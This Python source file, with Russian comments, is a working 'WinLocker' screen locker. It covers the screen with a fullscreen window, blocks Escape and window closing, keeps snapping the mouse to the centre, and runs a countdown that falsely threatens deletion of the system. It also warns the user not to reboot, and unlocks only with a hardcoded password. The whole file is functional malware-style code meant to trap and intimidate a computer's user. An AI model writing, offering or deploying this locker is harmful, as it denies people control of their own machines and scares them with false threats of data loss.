import pyautogui
import sys
from tkinter import *
from tkinter import messagebox

# Константы
PASSWORD = '30121922'  # пароль для разблокировки
INITIAL_TIME = 60      # таймер в секундах (1 минута)
DELETE_MESSAGE = 'Удаление системы...'  # финальное сообщение

class WinLocker:
    def __init__(self):
        self.reading = ''
        self.time = INITIAL_TIME
        self.locked = True
        
        # Настройка главного окна
        self.screen = Tk()
        self.screen.title("Windows Locked")
        self.screen.attributes('-fullscreen', True)
        self.screen.configure(bg='#1c1c1c')
        self.screen.bind("<Escape>", lambda e: "break")  # Блокировка Esc
        
        # Блокировка Alt+F4, Win и других сочетаний
        self.screen.protocol("WM_DELETE_WINDOW", self.prevent_close)
        pyautogui.FAILSAFE = False
        
        self.create_widgets()
        self.update_loop()
        
    def create_widgets(self):
        """Создание интерфейса"""
        # Основные надписи
        Label(self.screen, text="ВАША СИСТЕМА ЗАБЛОКИРОВАНА!", 
             font=("Arial", 30, "bold"), fg="red", bg="#1c1c1c").pack(pady=50)
        
        Label(self.screen, text="Введите пароль для разблокировки", 
             font=("Arial", 16), fg="white", bg="#1c1c1c").pack()
        
        # Поле ввода пароля
        self.field = Entry(self.screen, font=("Arial", 24), fg="green", 
                          bd=0, justify=CENTER, show="*", insertbackground="green")
        self.field.pack(pady=20, ipady=10)
        self.field.focus_set()
        
        # Кнопка разблокировки
        self.but = Button(self.screen, text="РАЗБЛОКИРОВАТЬ", font=("Arial", 14), 
                        command=self.password_check, bg="#333", fg="white", 
                        activebackground="#444", activeforeground="white")
        self.but.pack(pady=10, ipadx=20, ipady=5)
        
        # Таймер
        self.timer_frame = Frame(self.screen, bg="#1c1c1c")
        self.timer_frame.pack(pady=30)
        
        Label(self.timer_frame, text="До удаления системы осталось:", 
             font=("Arial", 14), fg="white", bg="#1c1c1c").pack(side=LEFT)
        
        self.l = Label(self.timer_frame, text=self.time, 
                      font=("Arial", 22, "bold"), fg="red", bg="#1c1c1c")
        self.l.pack(side=LEFT, padx=10)
        
        # Предупреждение
        Label(self.screen, text="Не перезагружайте компьютер - это приведёт к потере данных!", 
             font=("Arial", 12), fg="red", bg="#1c1c1c").pack(pady=20)
        
        # Привязка Enter к проверке пароля
        self.field.bind('<Return>', self.password_check)
        
    def prevent_close(self):
        """Блокировка закрытия окна"""
        pass
        
    def block(self):
        """Блокировка мыши"""
        if self.locked:
            try:
                pyautogui.moveTo(self.screen.winfo_screenwidth()//2, 
                               self.screen.winfo_screenheight()//2)
                pyautogui.click()
            except:
                pass
        
    def password_check(self, event=None):
        """Проверка пароля"""
        self.reading = self.field.get()
        if self.reading == PASSWORD:
            self.locked = False
            self.screen.destroy()
            sys.exit()
        else:
            messagebox.showerror("Ошибка", "Неверный пароль!")
            self.field.delete(0, END)
        
    def update_loop(self):
        """Обновление таймера"""
        if self.locked:
            if self.time > 0:
                self.time -= 1
                self.l.config(text=f"{self.time} сек")
            else:
                self.l.config(text=DELETE_MESSAGE)
                self.but.config(state=DISABLED)
                self.field.config(state=DISABLED)
            
            self.block()
            self.screen.after(1000, self.update_loop)

if __name__ == "__main__":
    try:
        app = WinLocker()
        app.screen.mainloop()
    except KeyboardInterrupt:
        pass
